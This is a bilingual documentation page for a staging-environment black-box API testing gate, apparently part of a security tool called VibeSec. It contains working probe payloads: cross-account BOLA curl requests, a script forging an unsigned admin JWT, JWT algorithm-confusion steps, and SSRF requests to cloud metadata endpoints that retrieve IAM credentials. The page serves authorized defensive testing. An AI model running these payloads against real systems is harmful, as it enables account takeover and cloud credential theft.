
[正體中文（臺灣）](#zh-tw) | [English](#english)

<a id="zh-tw"></a>

# 06 G5 DAST 與 API（黑箱；部署至 Staging 後、上線前）

| 項目 | 值 |
|---|---|
| 閘門 ID | `G5` |
| 性質 | 黑箱、由外而內；staging 階段；需要兩個不同權限帳號的 Token |
| 設定 | `vibesec.yaml` → `gates.g5_dast_api`（`stage: staging`、`target_url_env: VIBESEC_TARGET_URL`、`tools: [zap-baseline, zap-api-scan, api-probes]`、`two_account_test: required`、`account_a_token_env: VIBESEC_TOKEN_A`、`account_b_token_env: VIBESEC_TOKEN_B`、`checks: [bola_idor, jwt_alg_none, jwt_alg_confusion, ssrf_metadata, swagger_exposed, graphql_introspection, debug_stacktrace, rate_limit]`、`timeout_seconds: 1800`） |
| 設定檔 | `config/zap/api-scan.conf`、`config/zap/two-account-context.yaml` |
| 負責 | Red Team |
| 硬規則 | 探針只能對 `VIBESEC_TARGET_URL` 指向的、已授權的測試環境執行（CLAUDE.md 規則 8）。CI 中由 repo 管理者設定的 Actions 變數 `vars.VIBESEC_TARGET_URL` 提供，工作流程不接受手動輸入的目標 |

## 對抗成因

兩類問題在原始碼靜態看不出來，必須對跑起來的服務實測：

1. **開發便利設定外溢**：AI 為了讓你「馬上能測」而開啟 Swagger UI、GraphQL Introspection、Debug Mode，並讓錯誤回應吐出 Stack Trace。這些在 staging 很方便，忘了在正式關閉就變成攻擊者的地圖。
2. **授權繞過只有打才知道**：owner binding 是否真的生效、JWT 是否真的拒絕 `alg:none`、URL 匯入是否真能讀中繼資料——靜態規則只能給「候選」，G5 用真實 HTTP 交換把它變成 E3 證據。這也是白箱 → 黑箱映射的落地點（見 docs/00 §4）。

## 觸發時機與性質

- 部署到 staging 後、上線前；定期複測。
- 需要 `VIBESEC_TARGET_URL`、`VIBESEC_TOKEN_A`、`VIBESEC_TOKEN_B`。**缺任一 → G5 `incomplete`**（`two_account_test: required`），不得記 pass（CLAUDE.md 規則 2）。
- 性質：實證型發現（雙帳號 BOLA 成功、`alg:none` 被接受、SSRF 讀到中繼資料）為 blocking 且 `evidence_grade: E3`；資訊外溢多為 advisory。

## 核心任務

### 1. 雙帳號 BOLA / IDOR 實測（`bola_idor`）

原則：必須持有至少兩個不同主體 / 權限的 Token，才能實證授權；以 B 的 Token 存取 A 的資源 ID。情境定義在 `config/zap/two-account-context.yaml`（帳號 A = 受害者、B = 攻擊者同角色、ANON = 無 Token）。

```bash
export VIBESEC_TARGET_URL=https://staging.example.com
A="Authorization: Bearer $VIBESEC_TOKEN_A"
B="Authorization: Bearer $VIBESEC_TOKEN_B"

# 1) A 建立資源，取得 id
TID=$(curl -s -X POST "$VIBESEC_TARGET_URL/api/todos" -H "$A" -H 'Content-Type: application/json' \
      -d '{"title":"vibesec-bola-probe"}' | jq -r .id)

# 2) B 讀 A 的資源 → 期望 403/404；得到 2xx = BOLA
curl -s -o /dev/null -w '%{http_code}\n' "$VIBESEC_TARGET_URL/api/todos/$TID" -H "$B"        # 期望 403 或 404
curl -s -o /dev/null -w '%{http_code}\n' -X PUT "$VIBESEC_TARGET_URL/api/todos/$TID" -H "$B" \
     -H 'Content-Type: application/json' -d '{"title":"hijacked"}'                            # 期望 403/404
curl -s -o /dev/null -w '%{http_code}\n' -X DELETE "$VIBESEC_TARGET_URL/api/todos/$TID" -H "$B"

# 3) ANON（無 Token）讀 → 期望 401/403；得到 2xx = 前端防禦假象（缺 Session 驗證）
curl -s -o /dev/null -w '%{http_code}\n' "$VIBESEC_TARGET_URL/api/todos/$TID"

# 4) 列表隔離：B 的清單不得出現 A 的 marker
curl -s "$VIBESEC_TARGET_URL/api/todos" -H "$B" | grep -q 'vibesec-bola-probe' && echo "FAIL: list leaks A's data"
```

- B 取得 2xx → `vibesec.g5.bola-cross-account`（blocking，CWE-639，E3）。
- ANON 取得 2xx → `vibesec.g5.missing-session-check`（blocking，CWE-287，E3）。
- 自動化（`session_check`）：`staging-blackbox.yml` 對 `vibesec.yaml` 的 `gates.g5_dast_api.protected_paths` 逐一送「無 token」與「無效 token」請求；任一取得 2xx → fail；兩者皆 401/403 → pass；其餘（404、5xx、連線失敗）→ untested；未設定 `protected_paths` → untested（探針無法從外部推斷哪些端點該受保護，incomplete ≠ pass）。
- 完整 HTTP 交換（遮罩 Token）存 `reports/g5/<resource>-<account>.http`，`evidence_refs.kind: http_exchange`。
- 功能層級（BFLA / 垂直越權）：一般使用者 Token 呼叫 `/api/admin/*` 必須 401/403。
- 工具：curl / httpx（harness `api-probes`）、Burp Suite Pro 的 **Autorize**（自動重放改用低權 Token）與 **AuthMatrix**（角色 × 資源矩陣）、Schemathesis 自訂 hook 對 OpenAPI 每個路徑跑雙帳號。

### 2. JWT：拒絕 alg:none、防 RS256 / HS256 混淆（`jwt_alg_none`、`jwt_alg_confusion`）

```bash
# alg:none — 去掉簽章並把 header alg 改 none；伺服器接受 = 可偽造任意身分
python3 - <<'EOF'
import base64, json
def b64(d): return base64.urlsafe_b64encode(json.dumps(d).encode()).rstrip(b'=').decode()
hdr = b64({"alg":"none","typ":"JWT"})
pl  = b64({"sub":"1","role":"admin"})      # 宣稱 admin
print(f"{hdr}.{pl}.")                       # 空簽章
EOF
curl -s -o /dev/null -w '%{http_code}\n' "$VIBESEC_TARGET_URL/api/admin/users" \
     -H "Authorization: Bearer <上面輸出>"   # 得到 2xx = vibesec.g5.jwt-alg-none

# RS256 / HS256 混淆 — 拿伺服器「公鑰」當 HMAC 密鑰簽 HS256
# 取得公鑰（/.well-known/jwks.json 或 /publickey）→ 轉 PEM → 用它 HMAC-SHA256 簽 {"alg":"HS256"}
# 伺服器若用公鑰驗 HS256 簽章 → 接受 → vibesec.g5.jwt-alg-confusion
```

判定：`alg:none` 被接受 → `vibesec.g5.jwt-alg-none`；公鑰簽的 HS256 被接受 → `vibesec.g5.jwt-alg-confusion`（皆 blocking，CWE-347，E3）。白箱對應 `vibesec.g3.jwt-alg-*`。

`jwt_alg_confusion` 的四種狀態（incomplete ≠ pass）：探針讀登入 token 的 header `alg` →
- 對稱演算法（`HS*`）：無公鑰可混淆 → `not_applicable`（附理由）。
- 非對稱（`RS*`/`PS*`/`ES*`）：依序從 `/.well-known/jwks.json`、`/jwks.json`、`/.well-known/openid-configuration` 的 `jwks_uri` 取 `kid` 相符的 RSA 公鑰，以 stdlib 組出 SubjectPublicKeyInfo DER → PEM（須與伺服器公鑰逐位元組一致），再以 PEM 當 HMAC 金鑰、`alg=HS256` 重簽同一 payload 送至受保護端點：接受（200）→ `fail`（blocking）；明確 401/403 → `pass`；其餘 → `untested`。
- 取不到公鑰 → `untested`，附 advisory note，建議人工／Burp 驗證。

靶場 `examples/vulnapp` 預設以 RS256 簽發並於 `/.well-known/jwks.json` 公開公鑰；漏洞版驗章端接受 `HS256` 並拿公鑰 PEM 當 HMAC 金鑰（命中 `fail`），`VIBESEC_VULNAPP_MODE=patched` 則固定 `algorithms=[RS256]`（`pass`）。

### 3. SSRF 讀雲端中繼資料（`ssrf_metadata`）

針對「網址匯入 / 預覽 / webhook 設定 / 頭像 URL」等讓伺服器代為發出請求的端點：

```bash
for u in \
  "http://169.254.169.254/latest/meta-data/iam/security-credentials/" \
  "http://169.254.169.254/latest/api/token" \
  "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" \
  "http://[fd00:ec2::254]/latest/meta-data/"; do
  curl -s -X POST "$VIBESEC_TARGET_URL/api/import" -H "$A" -H 'Content-Type: application/json' \
       -d "{\"url\":\"$u\"}" | tee -a reports/g5/ssrf.log
done
# 回應含角色名 / AccessKeyId / token = vibesec.g5.ssrf-metadata（blocking，CWE-918，E3）
```

此處與 G3 `vibesec.g3.imdsv1-allowed` 直接呼應：IaC 未強制 IMDSv2 的白箱發現，由此黑箱證實是否真能取到憑證。

### 4. 開發設定外溢（`swagger_exposed`、`graphql_introspection`、`debug_stacktrace`）

```bash
# Swagger / OpenAPI 文件匿名可及
for p in /docs /redoc /swagger /swagger-ui.html /openapi.json /api-docs /v3/api-docs; do
  echo -n "$p "; curl -s -o /dev/null -w '%{http_code}\n' "$VIBESEC_TARGET_URL$p"   # 200 = vibesec.g5.swagger-exposed
done
# GraphQL Introspection
curl -s -X POST "$VIBESEC_TARGET_URL/graphql" -H 'Content-Type: application/json' \
  -d '{"query":"{__schema{types{name}}}"}' | jq -e '.data.__schema' >/dev/null && echo "introspection ON"  # vibesec.g5.graphql-introspection
# Debug / Stack Trace：送畸形輸入誘發 500
curl -s "$VIBESEC_TARGET_URL/api/todos/not-an-int" -H "$A" | grep -Eqi 'Traceback|at .*\(.*:[0-9]+\)|DEBUG = True|Werkzeug' && echo "stack trace leaked"  # vibesec.g5.debug-stacktrace
```

CI 的 api-probes 先請求不存在的路徑；沒有外洩時，再對 `openapi.json` 列出、無 path 參數的 POST 端點（最多 5 個）送型別混淆的 JSON（`{"query": 0, "message": 0, "input": 0, "id": 0}`），只要任一回應含 stack trace 標記就判 `vibesec.g5.debug-stacktrace`。

三者皆 advisory（CWE-200 / CWE-209）；但 Stack Trace 若洩漏原始碼路徑，harness 把該路徑回填為 SARIF 位置（黑箱 → 白箱）。

### 5. 速率限制與 Captcha（`rate_limit`）

```bash
# 登入 / 重設密碼：連續 50 次是否出現 429 或 Captcha 要求
code=$(for i in $(seq 1 50); do
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "$VIBESEC_TARGET_URL/api/login" \
    -H 'Content-Type: application/json' -d '{"email":"a@example.com","password":"wrong"}'
done | sort | uniq -c)
echo "$code" | grep -q 429 || echo "FAIL: no rate limit on login"   # vibesec.g5.missing-rate-limit
```

缺速率限制 / Captcha → `vibesec.g5.missing-rate-limit`（advisory，CWE-770）。與 G6 的 Denial of Wallet 同源但不同層：G5 看 HTTP 層節流，G6 看 LLM token 配額。

### 5a. CORS 反射 Origin（`cors_reflect_origin`）

```bash
curl -s -o /dev/null -D - "$VIBESEC_TARGET_URL/openapi.json" -H 'Origin: https://vibesec-cors-probe.invalid' \
  | grep -i '^access-control-allow-'
# ACAO 等於送出的 Origin 且 ACAC: true → vibesec.g5.cors-reflect-origin
```

CI 的 api-probes 帶 RFC 2606 保留網域 `.invalid` 的 Origin（不可能在任何白名單內）。ACAO 反射該 Origin 且 `Access-Control-Allow-Credentials: true` → `fail`（blocking，CWE-942）；沒反射 → `pass`；連線失敗 → `untested`。只反射不帶 credentials 不判此規則（交 ZAP 40040 的較寬判定）。

### 6. ZAP 掃描

```bash
# API scan（以 OpenAPI 為範圍；主動注入掃描）
docker run --rm -v "$PWD:/zap/wrk:rw" -t ghcr.io/zaproxy/zaproxy:stable \
  zap-api-scan.py -t "$VIBESEC_TARGET_URL/openapi.json" -f openapi \
  -c config/zap/api-scan.conf -r reports/zap-api.html -J reports/zap-api.json

# Baseline（被動 + spider；快速設定外溢與標頭）
docker run --rm -v "$PWD:/zap/wrk:rw" -t ghcr.io/zaproxy/zaproxy:stable \
  zap-baseline.py -t "$VIBESEC_TARGET_URL" \
  -c config/zap/api-scan.conf -r reports/zap-baseline.html -J reports/zap-baseline.json
```

`config/zap/api-scan.conf` 把 SQL / command / SSTI / XSS / CORS / Cloud Metadata 設 FAIL，資訊外溢與標頭設 WARN，timestamp / user-agent fuzzer 設 IGNORE。**ZAP 不涵蓋 Prompt Injection**（交 G6）。rule_id 記 `zap:<id>`，CWE 取 ZAP alert 的 `cweid`。

### 7. 其他工具

- **Nuclei**：YAML 範本快掃已知 CVE 與錯誤設定（`nuclei -u "$VIBESEC_TARGET_URL" -tags cve,exposure,misconfig -se sarif -o reports/nuclei.sarif`）。
- **Schemathesis**：以 OpenAPI 做屬性測試 / fuzzing，自動覆蓋每個路徑，可掛雙帳號 hook（`schemathesis run "$VIBESEC_TARGET_URL/openapi.json" --checks all --report`）。
- **Burp Suite Pro**：Autorize / AuthMatrix 的互動式授權測試（L2 / L3）。

## 自動化作法

`.github/workflows/staging-blackbox.yml` 的 G5 job：

1. 等待 / 觸發 staging 部署健康檢查通過。
2. 檢查三個環境變數齊全（缺 → `incomplete`，summary 紅字）。
3. 依序：ZAP baseline → ZAP api-scan → `api-probes`（雙帳號 BOLA、JWT、SSRF、設定外溢、rate limit，讀 `two-account-context.yaml`）→ Nuclei / Schemathesis（L2+）。
4. 合併 SARIF 與 HTTP 證據 → `reports/g5.gate-result.json`（`coverage`: `ASVS5-V8.2`、`V7.1`、`V9.1`、`V13.4`、`V3.3`、`V2.4`、`V6.2`）。
5. harness 把每筆黑箱發現嘗試回填白箱位置（docs/00 §4）。

## 工具與設定檔

| 工具 | 用途 | 設定 |
|---|---|---|
| OWASP ZAP（免費，Docker） | baseline + api-scan；注入、設定外溢、標頭 | `config/zap/api-scan.conf` |
| api-probes（harness） | 雙帳號 BOLA、JWT、SSRF、rate limit | `config/zap/two-account-context.yaml` |
| Burp Suite Pro（商用） | Autorize / AuthMatrix | — |
| Nuclei | 範本掃 CVE / exposure | — |
| Schemathesis / API Harvester | OpenAPI fuzzing、BOLA、rate limit | — |

## 阻擋政策

| 規則 | 層級 | CWE |
|---|---|---|
| `vibesec.g5.bola-cross-account`、`missing-session-check` | blocking（E3） | CWE-639 / CWE-287 |
| `vibesec.g5.jwt-alg-none`、`jwt-alg-confusion` | blocking（E3） | CWE-347 |
| `vibesec.g5.ssrf-metadata` | advisory（E3） | CWE-918 |
| `vibesec.g5.cors-reflect-origin`（反射 Origin + Allow-Credentials） | blocking | CWE-942 |
| `vibesec.g5.swagger-exposed`、`graphql-introspection`、`debug-stacktrace` | advisory | CWE-200 / CWE-209 |
| `vibesec.g5.missing-rate-limit` | advisory | CWE-770 |
| 缺 Token / Target / staging 未啟動 | `incomplete` | — |

## 對應控制（ASVS、CWE、LLM Top 10、MAESTRO）

| 類型 | ID |
|---|---|
| ASVS 5.0（節層級，自編；V7–V9、V13 為 vibesec-extension；對應舊版 V9 / V10 的身分 / 授權 / Session / Token 語意） | `ASVS5-V8.2` 物件層級授權（BOLA）、`ASVS5-V7.1` Session、`ASVS5-V9.1` JWT、`ASVS5-V1.3` / `ASVS5-V13.2` SSRF、`ASVS5-V13.4` 資訊外溢、`ASVS5-V3.3` CORS、`ASVS5-V2.4` / `ASVS5-V6.2` 反自動化 / 身分驗證節流 |
| CWE | `CWE-639`、`CWE-287`、`CWE-347`、`CWE-918`、`CWE-200`、`CWE-209`、`CWE-770`、`CWE-942` |
| LLM Top 10 2025 | `LLM10:2025`（rate limit 與 DoW 同源） |
| MAESTRO | `MAESTRO-L6` Security & Compliance（前端假象、單層授權）、`MAESTRO-L4`（SSRF → 中繼資料） |

（控制僅以上述 catalog ID 引用；不使用 ASVS 官方需求編號。）

## 驗證方式

- **失敗通知**：`staging-blackbox.yml` 的 notify job（僅 main）依 `.github/scripts/staging-issue.js` 判定：靶場上 G5／G6 應為 `fail` 且有 blocking，否則視為偵測退步；外部目標 G5／G6 非 `pass`（fail 或 incomplete）；job 失敗或缺閘門結果 → 開／更新追蹤 issue，恢復後自動關閉。

1. **缺 Token 行為**：移除 `VIBESEC_TOKEN_B` → G5 `incomplete`（`status_reason: "VIBESEC_TOKEN_B missing"`），絕不 pass。
2. **靶場正例**（`examples/vulnapp`）：B 讀 A 的 todo 回 200 → `bola-cross-account`；`alg:none` 被接受；`/api/import` 讀到 `169.254.169.254` 的角色名；`/docs` 回 200。
3. **反例**：修復後 B 讀 A 回 404、`alg:none` 回 401、SSRF 被 egress allowlist 擋 → 對應 finding `retest_result: fixed`、`validation_status: confirmed`。
4. **只打授權目標**：harness 拒絕 `VIBESEC_TARGET_URL` 指向非 staging / 非允許清單的主機（CLAUDE.md 規則 8）；單元測試覆蓋此拒絕。
5. **證據留存**：每個 blocking 發現有 `reports/g5/*.http`（Token 已遮罩）與 `evidence_grade: E3`。
6. **回填白箱**：Stack Trace 洩漏的路徑在 SARIF 有對應位置；BOLA 端點能對回 G4 的 `missing-owner-filter` finding。

## 執行器與完整性

`python3 scripts/g5_api_probes.py` 是工作流程與本機評測共用的 API 探針。HTTP 用戶端拒絕跨來源及 HTTPS 降級重新導向，認證資訊只送到授權來源；所有 JWT 候選端點都回 404／405 時記 `untested`，不能證明驗證成功。

探針讀取 `config/zap/two-account-context.yaml`，亦可用 `VIBESEC_ACCESS_CONTEXT` 指定受測專案設定。支援建立／預植資源、B／ANON 的讀寫刪除請求、A 的讀取對照、清單隔離及功能層級權限；A、B 必須使用不同權杖。路徑、資源 ID 與標記須符合受測專案，範本不能直接當成完成證據。

ZAP API 與 Baseline 使用 `config/zap/api-scan.conf`。Action 完成後立即另存各自的 `report_json.json`；`scripts/g5_gate.py` 合併 API 探針與兩份 ZAP 報告，並核對步驟 outcome。缺報告或失敗不會算完成，警示依政策計數。最終由 `scripts/gate_verdict.py` 執行 shadow／enforce 判定。


---

<a id="english"></a>

The workflow and local evaluations use the same API probe implementation in `scripts/g5_api_probes.py`.

# 06 G5 DAST and API Testing (Black-Box; Staging / Pre-Release)

G5 tests running services from outside and requires two distinct subjects' tokens. Red team owns it. Configure `gates.g5_dast_api`: staging, `VIBESEC_TARGET_URL`, ZAP baseline/API scan and API probes, required two-account tests, `VIBESEC_TOKEN_A/B`, check list, and 1,800-second timeout. Settings: `config/zap/api-scan.conf`, `two-account-context.yaml`.

**Only attack the authorized test environment.** CI gets its target from administrator-controlled `vars.VIBESEC_TARGET_URL`, never an arbitrary manual workflow input.

## Causes addressed

AI-generated development conveniences—Swagger, GraphQL introspection, debug modes, stack traces—can leak into deployment. Static authorization findings remain candidates until HTTP tests demonstrate actual ownership checks, JWT rejection, or metadata access. G5 supplies reproducible dynamic evidence for the white-box/black-box loop.

## Triggers and nature

Run after staging deployment, before release, and periodically. Missing target or either required token makes G5 incomplete, never pass. Proven BOLA/JWT bypasses provide E3 evidence; actual blocking tiers come from policy. Information exposure is usually advisory.

## Core tasks

### 1. Two-account BOLA/IDOR

Define A (resource owner), B (other same-role subject), and ANON (no token) in the context file. A creates a marked resource and captures its ID. B attempts read/update/delete: expect 403/404, never 2xx. ANON attempts read: expect 401/403. B's list must not contain A's marker. The shared shell example illustrates these requests.

- Cross-account success: blocking `vibesec.g5.bola-cross-account`, CWE-639, E3.
- Anonymous success: blocking `missing-session-check`, CWE-287, E3.
- `protected_paths` session checks send absent and invalid tokens: any 2xx fails; both 401/403 pass; 404/5xx/network failure is untested. An empty configured path list is untested because the probe cannot infer which endpoints should be private.
- Save masked HTTP exchanges under `reports/g5/`, with `http_exchange` evidence references.
- Test vertical/function authorization too: ordinary users must not access admin functions.
- Tools: shared probes/curl/httpx, Burp Autorize/AuthMatrix, and Schemathesis two-account hooks.

### 2. JWT none and algorithm confusion

Test an unsigned JWT declaring `alg: none` and an administrative identity against an actual protected endpoint. Acceptance yields blocking `jwt-alg-none`. Test asymmetric/symmetric confusion by signing an HS256 token using the server's public-key PEM as the HMAC secret; acceptance yields `jwt-alg-confusion`. Both map to CWE-347/E3 and G3 JWT rules.

Confusion-test states:

- An HS-family login token has no asymmetric public key to confuse: `not_applicable`, with reason.
- For asymmetric tokens, try standard JWKS endpoints and OIDC `jwks_uri`; select the matching RSA `kid`, build SubjectPublicKeyInfo PEM, and resign the same payload. The PEM bytes must match the server's representation. HTTP 200 fails; explicit 401/403 passes; other responses are untested.
- No usable key: untested with a recommendation for manual/Burp validation.

The lab issues RS256 tokens and publishes JWKS. Vulnerable mode accepts HS256 using public-key bytes; patched mode fixes algorithms to RS256. If all candidate endpoints return 404/405, no successful verification has occurred.

### 3. Metadata SSRF

Probe authorized server-fetch features such as URL import/preview/webhooks/avatar fetches with AWS IPv4 metadata, IMDS token path, GCP metadata token path, and AWS IPv6 metadata. Role names, AccessKeyId, or tokens demonstrate `ssrf-metadata` (CWE-918/E3); its base-policy tier is advisory, subject to overrides. Correlate with G3 IMDSv1 findings. The shared examples are for isolated authorized environments only.

### 4. Development exposure

Check anonymous `/docs`, `/redoc`, Swagger/OpenAPI variants; GraphQL `__schema`; and malformed inputs that expose Python/JS/Werkzeug debug traces. CI first requests a nonexistent path, then up to five OpenAPI POST endpoints without path parameters using type-confused JSON (`query`, `message`, `input`, `id` set to zero). Any trace marker flags `debug-stacktrace`.

Swagger/introspection/debug findings are advisory (CWE-200/209). If a trace identifies source files/lines, attach SARIF locations for root-cause work.

### 5. Rate limits and CAPTCHA

In an authorized test, send 50 failed login/password-reset requests and look for 429 or a challenge. No throttling yields advisory `missing-rate-limit`, CWE-770. G5 checks HTTP throttling; G6 checks token/cost quotas.

### 5a. Reflected CORS origin

Send `Origin: https://vibesec-cors-probe.invalid`. Reflection of that reserved untrusted origin together with `Access-Control-Allow-Credentials: true` yields blocking `cors-reflect-origin` (CWE-942). No reflection passes; network failure is untested. Reflection without credentials is left to ZAP's broader 40040 rule.

### 6. ZAP

Run `zap-api-scan.py` against the OpenAPI document and `zap-baseline.py` against the target, using `config/zap/api-scan.conf` and separate JSON/HTML outputs. Shared Docker examples show the invocation. The configuration marks SQL/command/SSTI/XSS/CORS/metadata issues FAIL, information/header issues WARN, and timestamp/user-agent fuzzers IGNORE. Preserve `zap:<id>` and native `cweid`. ZAP does not test prompt injection; G6 does.

### 7. Additional tools

Nuclei offers fast CVE/exposure/misconfiguration templates; Schemathesis provides OpenAPI property/fuzz tests and account hooks; Burp Pro adds interactive Autorize/AuthMatrix checks for L2/L3. These are optional additions, not evidence that absent tools ran.

## Automation

Wait for a healthy authorized staging deployment; validate target/tokens; run ZAP baseline/API and shared API probes, with configured optional tools; merge outputs/HTTP evidence into a gate result; map dynamic findings back to code. Coverage includes authorization, session/JWT, exposure, CORS, anti-automation, and authentication throttling. ZAP settings live in `api-scan.conf`; resource/role scenarios live in the access-context YAML.

## Blocking policy

| Rule suffix (`vibesec.g5.`) | Base tier | CWE |
|---|---|---|
| bola-cross-account / missing-session-check | Blocking, E3 | 639/287 |
| jwt-alg-none / jwt-alg-confusion | Blocking, E3 | 347 |
| ssrf-metadata | Advisory, E3 | 918 |
| cors-reflect-origin | Blocking | 942 |
| swagger-exposed / graphql-introspection / debug-stacktrace | Advisory | 200/209 |
| missing-rate-limit | Advisory | 770 |
| Missing target/token/unavailable staging | Incomplete | — |

## Mapped controls

Local ASVS section IDs: V8.2 object authorization, V7.1 sessions, V9.1 JWT, V1.3/V13.2 SSRF, V13.4 exposure, V3.3 CORS, V2.4/V6.2 automation/authentication throttling. V7–V9/V13 include VibeSec extensions, not official requirement IDs. CWE 639/287/347/918/200/209/770/942; `LLM10:2025`; MAESTRO L6/L4.

## Verification

Main-only notifications use `.github/scripts/staging-issue.js`: lab G5/G6 must demonstrate expected blocking failures; external targets must pass; failed jobs/missing results produce or update tracking issues, closed on recovery.

Test missing B token → incomplete; vulnerable lab BOLA/JWT/SSRF/docs; patched BOLA 404/JWT 401/blocked egress; authorized-target restrictions; masked HTTP evidence for blocking findings; and dynamic-to-code mappings. Retests confirm the original flaw and mark it fixed when remediation succeeds.

## Shared runner and completeness

`python3 scripts/g5_api_probes.py` serves workflows and local evaluations. Its HTTP client rejects cross-origin and HTTPS-downgrade redirects; credentials go only to the authorized origin.

Read `two-account-context.yaml` or override with `VIBESEC_ACCESS_CONTEXT`. Supported scenarios include created/preseeded resources, B/ANON CRUD, A read controls, list isolation, and function-level permissions. A/B tokens must differ. Configure actual paths, IDs, and markers; a template is not completed evidence. The bundled lab has its own matching context.

After each ZAP action, immediately preserve its native `report_json.json` separately. `scripts/g5_gate.py` combines both reports and probe results and validates step outcomes. Missing reports/tool failures cannot count as completed; alerts follow policy. `scripts/gate_verdict.py` applies shadow/enforce behavior.
